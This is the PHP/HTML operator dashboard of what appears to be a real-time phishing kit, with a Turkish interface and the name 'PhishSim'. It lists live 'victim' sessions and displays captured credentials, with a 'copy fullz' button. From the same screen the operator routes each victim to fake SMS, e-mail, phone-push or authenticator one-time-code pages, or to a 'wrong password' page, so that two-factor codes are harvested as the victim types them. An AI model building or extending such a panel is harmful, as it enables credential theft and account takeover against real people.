<?php
require_once('../shade/core/config.php');
require_once('../shade/core/visits.php');
require_once(__DIR__ . '/includes/assets.php');
if (empty($_SESSION['admin_pass']) || $_SESSION['admin_pass'] != ADMIN_PASS) {
    header('Location: ' . admin_asset('login'));
    exit;
}

$visitorCount = get_visit_count();
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PhishSim — Operasyon Merkezi</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <link rel="stylesheet" href="<?= admin_asset_esc('assets/css/bootstrap.min.css') ?>">
  <link rel="stylesheet" href="<?= admin_asset_esc('assets/css/admin.css') ?>">
</head>
<body>
  <div class="app-shell">
    <aside class="sidebar">
      <div class="sidebar-brand">
        <div class="brand-icon"><i class="fas fa-shield-alt"></i></div>
        <div>
          <strong>PhishSim</strong>
          <span>Operasyon Merkezi</span>
        </div>
      </div>

      <nav class="sidebar-nav">
        <a href="<?= admin_asset_esc('') ?>" class="side-link active"><i class="fas fa-satellite-dish"></i> Canlı Oturumlar</a>
        <a href="<?= admin_asset_esc('form') ?>" class="side-link"><i class="fas fa-edit"></i> Form Düzenle</a>
      </nav>
    </aside>

    <div class="main-area">
      <header class="topbar">
        <div class="topbar-left">
          <h1>Canlı Oturumlar</h1>
          <p>Oturum izleme ve yönlendirme</p>
        </div>
        <div class="topbar-right">
          <div class="live-indicator">
            <span class="live-dot"></span>
            CANLI
          </div>
          <div class="stat-pill">
            <i class="fas fa-eye"></i>
            <span id="visitor-count"><?= $visitorCount ?></span> ziyaret
          </div>
          <button type="button" class="btn-reset" id="reset-all-btn" title="Tüm oturumları ve victims verilerini sil">
            <i class="fas fa-trash-alt"></i>
            <span>Sıfırla</span>
          </button>
          <a href="<?= admin_asset_esc('logout') ?>" class="btn-logout" title="Çıkış">
            <i class="fas fa-sign-out-alt"></i>
          </a>
        </div>
      </header>

      <section class="stats-row">
        <div class="stat-card">
          <div class="stat-icon total"><i class="fas fa-users"></i></div>
          <div class="stat-info">
            <span class="stat-value" id="stat-total">0</span>
            <span class="stat-label">Toplam Oturum</span>
          </div>
        </div>
        <div class="stat-card">
          <div class="stat-icon online"><i class="fas fa-circle"></i></div>
          <div class="stat-info">
            <span class="stat-value" id="stat-online">0</span>
            <span class="stat-label">Çevrimiçi</span>
          </div>
        </div>
        <div class="stat-card highlight">
          <div class="stat-icon waiting"><i class="fas fa-hourglass-half"></i></div>
          <div class="stat-info">
            <span class="stat-value" id="stat-waiting">0</span>
            <span class="stat-label">Bekleyen</span>
          </div>
        </div>
        <div class="stat-card">
          <div class="stat-icon finished"><i class="fas fa-check-circle"></i></div>
          <div class="stat-info">
            <span class="stat-value" id="stat-finished">0</span>
            <span class="stat-label">Tamamlanan</span>
          </div>
        </div>
      </section>

      <section class="toolbar">
        <div class="search-box">
          <i class="fas fa-search"></i>
          <input type="text" id="search-input" placeholder="E-posta, IP veya ID ile ara...">
        </div>
        <div class="filter-group">
          <button class="filter-btn active" data-filter="all">Tümü</button>
          <button class="filter-btn" data-filter="waiting">Bekleyen</button>
          <button class="filter-btn" data-filter="online">Çevrimiçi</button>
          <button class="filter-btn" data-filter="away">Uzakta</button>
          <button class="filter-btn" data-filter="finished">Tamamlanan</button>
        </div>
      </section>

      <section class="sessions-panel">
        <div class="panel-header">
          <h2><i class="fas fa-list"></i> Aktif Oturumlar</h2>
          <span class="refresh-hint"><i class="fas fa-sync-alt fa-spin"></i> Her saniye güncelleniyor</span>
        </div>
        <div id="sessions-container">
          <div class="empty-state">
            <i class="fas fa-radar"></i>
            <h3>Oturum yok</h3>
            <p>Yeni bağlantılar burada listelenecek.</p>
          </div>
        </div>
      </section>
    </div>
  </div>

  <!-- Victim Detail Modal -->
  <div class="modal fade" id="victimModal" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <div class="modal-title-group">
            <h5 class="modal-title" id="modal-victim-title">Oturum Detayı</h5>
            <span class="modal-status-badge" id="modal-status-badge"></span>
          </div>
          <button type="button" class="close" data-dismiss="modal" aria-label="Kapat">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <input type="hidden" id="victim-id-modal">

          <div class="modal-grid">
            <div class="modal-section">
              <div class="section-header">
                <h6><i class="fas fa-fingerprint"></i> Oturum Bilgisi</h6>
              </div>
              <div id="session-meta" class="meta-grid"></div>

              <div class="section-header">
                <h6><i class="fas fa-key"></i> Yakalanan Veriler</h6>
                <button type="button" class="btn-copy-all" id="copyfullz">
                  <i class="fas fa-copy"></i> Tümünü Kopyala
                </button>
              </div>
              <div id="data_capt" class="data-fields"></div>
            </div>

            <div class="modal-section routing-section">
              <div class="section-header">
                <h6><i class="fas fa-route"></i> Sayfa Yönlendirme</h6>
              </div>
              <p class="routing-hint">Kullanıcıyı bir sonraki adıma yönlendirin. Bekleme ekranındaki oturumlar için kullanın.</p>

              <div class="route-options">
                <label class="route-card" data-page="otp1">
                  <input type="radio" name="pagesRadios" value="otp1">
                  <div class="route-card-body">
                    <i class="fas fa-sms"></i>
                    <strong>SMS OTP</strong>
                    <span>Telefona gönderilen kod</span>
                  </div>
                </label>
                <label class="route-card" data-page="otp2">
                  <input type="radio" name="pagesRadios" value="otp2">
                  <div class="route-card-body">
                    <i class="fas fa-envelope"></i>
                    <strong>E-posta OTP</strong>
                    <span>Mail ile gelen kod</span>
                  </div>
                </label>
                <label class="route-card" data-page="yahoo">
                  <input type="radio" name="pagesRadios" value="yahoo">
                  <div class="route-card-body">
                    <i class="fas fa-mobile-alt"></i>
                    <strong>Telefon Bildirimi</strong>
                    <span>Cihazda onay isteği</span>
                  </div>
                </label>
                <label class="route-card" data-page="otp3">
                  <input type="radio" name="pagesRadios" value="otp3">
                  <div class="route-card-body">
                    <i class="fas fa-lock"></i>
                    <strong>Authenticator</strong>
                    <span>2FA uygulama kodu</span>
                  </div>
                </label>
                <label class="route-card warning" data-page="wrong">
                  <input type="radio" name="pagesRadios" value="wrong">
                  <div class="route-card-body">
                    <i class="fas fa-exclamation-triangle"></i>
                    <strong>Yanlış Şifre</strong>
                    <span>Tekrar giriş iste</span>
                  </div>
                </label>
                <label class="route-card danger" data-page="finish">
                  <input type="radio" name="pagesRadios" value="finish">
                  <div class="route-card-body">
                    <i class="fas fa-flag-checkered"></i>
                    <strong>Bitir</strong>
                    <span>Oturumu bitir</span>
                  </div>
                </label>
              </div>

              <div class="route-params" id="route-params-otp1">
                <label>Gösterilecek telefon numarası</label>
                <input type="text" class="form-control" id="phonenum" placeholder="örn. **42">
              </div>
              <div class="route-params" id="route-params-yahoo">
                <label>Telefonda gösterilecek onay numarası</label>
                <input type="text" class="form-control" id="gmail" placeholder="örn. 70" maxlength="2" inputmode="numeric">
              </div>

              <button type="button" class="btn btn-primary route-submit saveChanges">
                <i class="fas fa-paper-plane"></i> Yönlendir
              </button>
            </div>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-danger btn-sm" id="deletebtn">
            <i class="fas fa-trash"></i> Oturumu Sil
          </button>
          <button type="button" class="btn btn-secondary" data-dismiss="modal">Kapat</button>
        </div>
      </div>
    </div>
  </div>

  <div id="toast-container"></div>

  <script>window.ADMIN_API = <?= json_encode(project_asset('shade/core/ajax.php')) ?>;</script>
  <script src="<?= admin_asset_esc('assets/js/jquery.min.js') ?>"></script>
  <script src="<?= admin_asset_esc('assets/js/popper.min.js') ?>"></script>
  <script src="<?= admin_asset_esc('assets/js/bootstrap.min.js') ?>"></script>
  <script src="<?= admin_asset_esc('assets/js/admin.js') ?>"></script>
</body>
</html>
